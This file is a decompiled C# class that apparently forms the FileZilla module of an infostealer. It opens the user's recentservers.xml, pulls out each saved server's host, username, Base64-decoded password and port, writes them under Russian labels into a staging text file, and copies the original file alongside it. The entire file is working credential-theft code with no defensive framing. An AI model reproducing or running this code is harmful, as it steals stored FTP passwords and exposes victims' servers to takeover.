using System;
using System.IO;
using System.Xml;

// Token: 0x0200000F RID: 15
internal class FZ
{
	// Token: 0x06000023 RID: 35 RVA: 0x00003EB0 File Offset: 0x000020B0
	public static void Start()
	{
		string text = string.Format("{0}FileZilla", global::Buffer.path_l);
		string text2 = string.Format("{0}FileZilla\\recentservers.xml", global::Buffer.path_ad);
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		if (File.Exists(text2))
		{
			try
			{
				string text3 = "";
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(text2);
				foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
				{
					XmlElement xmlElement = (XmlElement)obj;
					try
					{
						string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
						if (innerText.Length > 3)
						{
							text3 += "=====================================\n";
							text3 = text3 + "Хост: " + innerText + "\n";
							text3 = text3 + "Имя пользователя: " + xmlElement.GetElementsByTagName("User")[0].InnerText + "\n";
							text3 = text3 + "Пароль: " + Base64.Decode(xmlElement.GetElementsByTagName("Pass")[0].InnerText, null) + "\n";
							text3 = text3 + "Порт: " + xmlElement.GetElementsByTagName("Port")[0].InnerText + "\n";
							text3 += "=====================================\n\n\n";
						}
					}
					catch
					{
					}
				}
				File.WriteAllText(string.Format("{0}\\FileZilla.txt", text), text3.Trim().Replace("\n", Environment.NewLine));
			}
			catch
			{
			}
			File.Copy(text2, string.Format("{0}\\recentservers.xml", text));
			global::Buffer.XBufferData[2] = "1";
			return;
		}
		File.WriteAllText(string.Format("{0}\\data.txt", text), string.Format("{0}", global::Buffer.head));
		global::Buffer.XBufferData[2] = "0";
	}
}
